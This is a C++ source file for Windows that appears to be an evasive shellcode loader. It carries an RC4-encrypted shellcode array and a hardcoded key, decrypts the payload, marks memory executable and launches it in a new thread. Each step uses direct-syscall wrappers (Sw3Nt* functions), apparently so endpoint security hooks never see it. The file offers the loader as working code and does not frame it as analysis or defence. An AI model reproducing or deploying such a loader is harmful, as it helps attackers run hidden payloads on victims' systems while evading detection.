#include <iostream>
#include <Windows.h>
#include "syscalls_common.h"
#include <vector>
#include <fstream>


// RC4 Key-Scheduling Algorithm (KSA)
void rc4_init(unsigned char* s, unsigned char* key, int key_len) {
    int i, j = 0;
    unsigned char k[256];

    // Initialize the permutation array S
    for (i = 0; i < 256; i++) {
        s[i] = i;
        k[i] = key[i % key_len];
    }

    // Permute S according to key
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + k[i]) % 256;
        std::swap(s[i], s[j]);
    }
}

// RC4 Pseudo-Random Generation Algorithm (PRGA)
void rc4_crypt(unsigned char* data, int data_len, unsigned char* key, int key_len) {
    unsigned char s[256];
    rc4_init(s, key, key_len);

    int i = 0, j = 0;
    for (int n = 0; n < data_len; n++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        std::swap(s[i], s[j]);

        // XOR the data with the keystream
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

unsigned char shellcode[] = \
"\xC8\x2F\x8E\xF7\xE9\x70\x37\x8C\xDF\x7D\xDE\x00\xF6\x2D\xF5\x39\x5F\xAE\x4B\x0A\x06\x02\x95\x35\x83\x1B\x34\x39\xC2\x67\x74\xF0\x4B\xCD\x73\xA4\xC6\x42\x2E"
"\xE0\xF8\x6A\xA1\x4A\x82\x0F\x35\xFC\x61\x3A\xA5\x03\x97\x6F\x16\xF4\x19\xAC\x3D\xD7\xCC\x2B\x9C\x87\xBB\x19\x5F\xA3\xC0\x61\x7A\xDC\x5B\x84\x64\x09\xAE\x61"
"\x05\x5A\x70\xEE\x25\x81\xAB\xE5\xFA\x63\xCE\xFA\xD7\xF0\x24\xDE\x3E\x7F\x5A\x26\x4B\xA5\xB8\xD1\x5F\x44\x17\x06\xDE\x5E\x6E\x72\x41\xBD\xA2\x3F\xC2\x59\x13"
"\x41\x5D\x3C\x8F\xD9\x33\x0C\x4E\x1A\x4D\xD6\x1E\x30\xB8\xC6\x0C\x29\x61\xD7\x53\xBC\x3B\x82\x1F\x60\xA8\xCF\xBA\x63\x85\xD8\x98\xCC\x23\x01\xD3\xF0\xE2\x22"
"\xCF\xA1\x3A\xD9\xAC\x02\x64\x27\xDB\x2A\x64\x9D\xE2\x43\x67\x4C\x03\xCA\xB6\x11\x44\x93\x35\x82\x6D\x73\x1E\xCB\x61\x7B\xAE\x9A\xA8\xE8\x34\x1D\x70\xEC\x90"
"\xA3\xDD\x3B\x91\xC5\x28\x06\x93\x17\x90\xC4\x5B\x69\x1F\x1C\x06\x49\xC2\x16\xFE\x68\x11\x75\x47\x2D\xC4\x37\x4E\xD7\x51\xE5\x12\x4B\xEB\x95\x0C\x90\xF8\x17"
"\x19\x99\xC8\xFF\x34\x56\x8D\x7D\x6A\xDF\xDD\x16\x09\x9C\x93\x82\x57\xD4\x88\x3A\xC4\xA6\x4A\x2B\xAD\x60\x1B\x4E\x94\x49\x23\x4B\x4B\xC5\x9E\xDF\x7A\x34\x44"
"\xF6\x67\xF7\x67\x1A\x09\x28\x93\xF2\xF9\xDC\xDE\x2B\xA8\x45\x65\x46\x17\x4D\xDA\x3D\x9C\x66\x8B\x05\x40\x79\xE4\x2C\x18\xE2\xCB\x6C\x59\x4A\xBD\xB7\xA5\x3C"
"\x0E\x93\xF6\x14\x13\xED\xD0\x13\xB9\x97\xCC\x02\x51\x93\x8E\x0E\xFC\x5E\xED\xCF\xE8\xFF\x00\x06\x05\xC2\xFC\x0C\x8D\xD5\x5F\x53\x3A\x8A\xA5\x44\x9E\x62\x7A"
"\xD0\x5F\xC4\x5B\x4E\x90\x26\xF6\x25\x1F\x0E\xDF\xAC\x28\x2A\xE5\xBE\x78\x19\x0B\x31\xCC\x6E\xC2\x2D\x96\xE0\xA2\xB4\x00\xF0\xB8\x72\x9E\xF2\x01\x3B\x23\xAA"
"\xA0\x02\xF5\x3D\x6D\x4E\x21\xE5\xA8\x23\x3E\x1D\xD4\xA7\x88\x9E\x91\xAE\x98\x9E\xBF\x29\x03\x89\xDB\x89\x56\x13\x2B\xA7\xEE\x8B\x0A\x16\xE3\xF0\xDA\x7F\xB5"
"\x4F\x84\x7D\xFF\xF4\x03\xBA\x99\xD1\x08\x3F\x5C\xF6\xAD\x9A\x31\xB5\x1F\xB4\x61\x5A\x8F\x5C\xCB\x0D\xC7\x9B\xB2\x60\x3C\xD8\x01\xC1\x11\xBC\x0D\xF8\x71\x05"
"\x19\xB4\x13\x3F\x52\xA7\xAD\xD4\x40\x51\x1F\x16\x51\x72\xC2\x73\x52\xFC\x17\xAF\xA2\x20\x2A\xC8\x54\x94\x1B\x41\x09\x1D\x62\x08\x09\x88\x80\xA9\xD3\x97\x8F"
"\x6F\x9D\xF5\x10\x35\x89\xE9\x22\x58\x75\xDD\xA9\xBF\xEE\x25\x8B\xE9\xD4\x6D\x44\xDD\x8A\x1F\x84\xC7\xC8\x65\x77\x86\x32\x8C\x91\xDE\x9D\x45\x47\xA9\x7C\xD9"
"\xCC\x79\x8C\x39\x12\x8D\x7C\x0D\xFD\x1B\x14\x70\xCB\x00\xEF\xF7\x3B\xBE\x92\x8C\xF8\x0A\x20\x22\x8D\xAB\x74\xD7\x83\x41\x6F\x3B\xE9\x9D\x54\x68\xA2\xD5\xEA"
"\xE2\xFC\xAE\x48\x00\xE6\x76\xBF\xC1\x95\xE7\x2D\x13\x36\xA3\xB0\x97\x8F\x38\xCD\x19\x82\xA3\x51\xFD\x32\x38\x12\x84\xAF\xEB\x99\x6D\xD4\x85\x11\xE0\x75\x9E"
"\x76\x32\xCB\xAC\x4E\x34\xDC\xCA\x27\x0B\x37\x82\x39\x29\xE7\x92\x6B\xEA\xC9\xFB\xA6\x6F\xC2\x0C\xCC\x25\x02\xF4\x9C\xC9\x43\xBC\x29\xF9\x6F\xA4\x2A\xA7\xF6"
"\xF8\x37\x65\x0D\x64\x2A\xB3\xFE\x4C\xA1\xB8\xA9\xFE\x36\x90\x2A\xC3\x60\x7A\xD1\xC9\x3E\xBC\xEE\x05\xA6\xFA\x05\x49\x9F\x2C\xA7\x1E\x8D\xCE\x4F\x4A\x44\xA2"
"\x2F\xE4\x9F\x34\x2F\x92\xF5\xCF\xCB\x57\x55\x0A\x44\xC5\xCE\x8F\xFC\xD3\x49\xC6\xC6\x08\xB7\x1B\x6A\x36\x43\xB4\x3F\x4E\x02\xFE\x4D\xE1\x85\x3D\xEE\x3F\xF4"
"\x91\x81\x81\x5C\x33\xA5\xDD\x6F\xF2\x9A\x6A\x84\x8B\x84\xE5\x1B\xC5\x9F\x55\x1A\x7B\xA5\xBC\xAA\xF6\x44\xCF\x34\xD1\x7D\xD8\xB0\x6B\xF3\xAF\x94\xAF\xB0\xE2"
"\xD5\x32\xA1\x22\x36\x6C\xC0\xD5\x6E\x22\x3C\xEE\x83\x56\xA2\xC1\x92\x88\xC8\xBA\x22\x5C\xB2\xDF\x62\x53\xCE\xE7\x6D\xA7\x08\xBD\x2F\xB0\xF2\x2F\xB1\x72\x50"
"\x23\x38\x52\xAF\x32\x1D\x62\xA2\x24\x1C\xF2\xB8\x2F\x48\x0C\x20\x0A\xBD\x70\xFD\x1B\x8A\xE0\x5C\x22\x83\xCC\xC7\x09\x46\x75\xDC\x5A\x73\xE9\x8D\x2E\x38\x36"
"\x61\xA5\x0D\xA9\x93\x16\xEC\x17\xF6\x2B\xDC\x24\x96\x4B\x62\x96\x9A\x72\xC0\x75\xAB\xA0\xE0\xFA\x1A\xA5\xCA\x16\x2C\x4C\x5F\x96\xF3\xCC\xEE\x6F\xAB\xEE\xA1"
"\xCC\x48\xFC\x3C\xC4\xF1\xC7\xD6\x53\x39\x5D\x93\x73\x0E\xDF\x56\xEC\xF7\x2C\x2B\xF0\xA6\xB7\xDD\x2D\x4B\x9F\x16\x3A";

void print_shellcode(unsigned char* shellcode, int length) {
    for (int i = 0; i < length; i++) {
        printf("\\x%02X", shellcode[i]);
    }
    std::cout << std::endl;
}


// Function to call shellcode
void ExecuteShellcode(void* shellcodeMemory) {
    HANDLE hThread = nullptr;
    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, GetCurrentProcess(), shellcodeMemory, nullptr, FALSE, 0, 0, 0, nullptr);
    if (status == 0) {
        std::cout << "Thread created successfully" << std::endl;
        WaitForSingleObject(hThread, INFINITE);
    }
    else {
        std::cerr << "NtCreateThreadEx failed with status: " << std::hex << status << std::endl;
    }
}

int main() {
    unsigned char key[] = "030917bb64a06a4a8d580dc3ff9b6e80";
    int key_len = sizeof(key) - 1;
    int shellcode_len = sizeof(shellcode) - 1;
    std::cout << "[*] Decrypting shellcode..." << std::endl;
    rc4_crypt(shellcode, shellcode_len, key, key_len);

    void* shellcodeMemory = nullptr;
    SIZE_T shellcodeSize = sizeof(shellcode);
    NTSTATUS status;

    // Allocate memory for the shellcode
    status = Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &shellcodeMemory, 0, &shellcodeSize,  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
        return -1;
    }

    // Copy the shellcode to the allocated memory
    memcpy(shellcodeMemory, shellcode, shellcodeSize);

    // Change memory protection to PAGE_EXECUTE_READ
    ULONG oldProtect;
    status = Sw3NtProtectVirtualMemory(GetCurrentProcess(), &shellcodeMemory, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
        return -1;
    }
    // Execute the shellcode in a new thread
    ExecuteShellcode(shellcodeMemory);

    return 0;
}